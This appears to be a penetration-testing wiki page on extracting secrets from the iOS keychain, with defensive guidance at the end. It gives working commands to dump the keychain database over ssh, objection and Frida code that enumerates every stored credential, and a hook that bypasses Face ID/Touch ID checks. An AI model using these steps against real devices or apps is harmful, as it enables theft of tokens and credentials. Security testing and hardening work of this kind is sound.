---
title: iOS keychain extraction
slug: ios-keychain-extraction
---

> **TL;DR:** On a jailbroken device or with a Frida bridge into the target's process, you can enumerate every keychain item the app's `keychain-access-groups` permits — common loot includes refresh tokens, biometric-protected secrets at the wrong protection class, and shared-group items from sister apps in the same Team ID.

## What it is
The iOS keychain is a system-wide SQLite-backed credential store accessed via the Security framework (`SecItemAdd`, `SecItemCopyMatching`). Items belong to one or more **access groups** (`keychain-access-groups` entitlement on the app) and have one of several **protection classes**:

- `kSecAttrAccessibleWhenUnlocked` — readable while device is unlocked.
- `kSecAttrAccessibleAfterFirstUnlock` — readable after the first unlock since boot (default for background-needed items).
- `kSecAttrAccessibleAlways` — deprecated, always readable.
- `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly` — requires passcode + non-backupable.
- `*ThisDeviceOnly` variants — never backed up, never restored.
- `SecAccessControl` with `kSecAccessControlUserPresence` / `BiometryCurrentSet` — requires biometric or device-passcode at the moment of access.

The interesting bugs almost always come from picking too weak a protection class (refresh tokens at `AfterFirstUnlock` rather than `WhenPasscodeSet`) or sharing access groups too broadly across the Team's app portfolio.

## Preconditions / where it applies
- Jailbroken iOS device (full keychain dump) **or** an in-process Frida hook on the target app (only that app's accessible items).
- Knowledge of the target's `keychain-access-groups` from the entitlements blob (see [[ios-ipa-structure]]).

## Technique
**1. Identify the app's access groups.**
```bash
codesign -d --entitlements - Payload/Victim.app/Victim | grep -A20 keychain
```
Items shared across apps in the same Team usually use a group like `TEAMID.com.victim.shared`.

**2. Dump from jailbroken device (offline).** The keychain is `/var/Keychains/keychain-2.db` on the device.
```bash
ssh root@device 'sqlite3 /var/Keychains/keychain-2.db .dump' > keychain.sql
```
But values are encrypted with per-class keys derived from the device UID + passcode; you need the Keychain Master Key (KMK) to decrypt. Older tools: **Keychain-Dumper** (Stefan Esser), **Keychain_Dumper** (binary on Cydia). On modern iOS / arm64e you need a kernel-level primitive to extract the KMK; in practice researchers use `Frida` on the running `securityd`.

**3. Dump from running app via Frida.** Easier and more reliable.
```bash
objection -g com.victim.app explore
> ios keychain dump
> ios keychain dump --json keychain.json
```
Behind the scenes objection calls `SecItemCopyMatching` with `kSecMatchLimit = kSecMatchLimitAll` for every protection class. Limited to the app's entitled access groups, but that's exactly the loot you want.

**4. Frida script — enumerate.**
```javascript
var q = ObjC.classes.NSMutableDictionary.dictionary();
q.setObject_forKey_('kSecClassGenericPassword', 'class');
q.setObject_forKey_(true, 'r_Data');
q.setObject_forKey_(true, 'r_Attributes');
q.setObject_forKey_('m_LimitAll', 'm_Limit');

var result = Memory.alloc(Process.pointerSize);
var fn = new NativeFunction(
  Module.findExportByName('Security', 'SecItemCopyMatching'),
  'int', ['pointer', 'pointer']);
fn(q.handle, result);
console.log(new ObjC.Object(result.readPointer()));
```
Run this for `kSecClassGenericPassword`, `kSecClassInternetPassword`, `kSecClassCertificate`, `kSecClassKey`, `kSecClassIdentity`.

**5. Biometric-gated items.** Items wrapped with `SecAccessControl` + `kSecAccessControlBiometryCurrentSet` normally require a TouchID/FaceID prompt at access time. Bypasses:
- Hook `LAContext evaluatePolicy:localizedReason:reply:` and call the reply block with `(BOOL)YES, nil` — defeats biometric *gate* but the underlying keychain item still requires LocalAuthentication context; on jailbroken devices recent research shows the LAContext can be forged.
- If the developer used `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly` (passcode, not biometric), unlock the device and the read succeeds.

**6. Common loot patterns.**
- OAuth refresh tokens stored as `kSecClassGenericPassword` keyed by `Service=<bundle-id>`.
- Push tokens (`apn-token`).
- Biometric-cached symmetric keys (used to derive E2EE secrets).
- Sister-app shared credentials — e.g., a banking app shares a token with its "lite" version via the access group.

## Detection and defence
- Use the strictest protection class compatible with the item's access pattern. Refresh tokens that don't need background access → `WhenPasscodeSetThisDeviceOnly`.
- Wrap secrets with `SecAccessControl(.biometryCurrentSet)` so re-enrolling Face ID invalidates them.
- For high-value items, derive them from a passphrase or Secure-Enclave-backed key and never store the raw secret.
- Minimise `keychain-access-groups`: every sister app that joins a group is now a trust-equivalent of the most sensitive item in it.
- Server-side: rotate refresh tokens on any anomaly; don't rely on keychain confidentiality alone.

## References
- [Apple — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [OWASP MASTG — iOS Data Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage/)
- [Stefan Esser — Keychain-Dumper](https://github.com/ptoomey3/Keychain-Dumper)
- [objection — iOS keychain commands](https://github.com/sensepost/objection/wiki/Notes-About-The-iOS-Keychain-Dumper)
